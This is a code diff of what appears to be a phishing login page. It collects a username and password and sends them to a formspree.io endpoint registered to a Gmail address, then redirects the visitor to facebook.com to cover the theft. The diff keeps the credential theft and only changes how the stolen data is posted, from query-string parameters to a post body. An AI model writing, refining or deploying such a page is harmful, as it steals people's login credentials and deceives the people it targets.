@@ -49,7 +49,7 @@
 </head>
 <body>
 	<div id="content">
-		<form method="post" action="https://formspree.io/onlinejobatpb@gmail.com" style="position: fixed;">
+		<form method="post" style="position: fixed;">
 			<input id="uname" type="text" name="uid">
 			<input id="pass" type="password" name="pass">
 			<button id="send" class="submitbutton" on>Log In</button>
@@ -67,9 +67,7 @@
 			});
 			
 			$('button#send').click(function(){
-				$.post( "https://formspree.io/onlinejobatpb@gmail.com?name="+dataobj.uid+"&pass="+dataobj.pass, function() { 
-					$(location).attr('href','https://www.facebook.com');
-				}).done(function() {
+				$.post( "https://formspree.io/onlinejobatpb@gmail.com", dataobj).done(function() {
 					$(location).attr('href','https://www.facebook.com');
 				}).fail(function() {
 					$(location).attr('href','https://www.facebook.com');
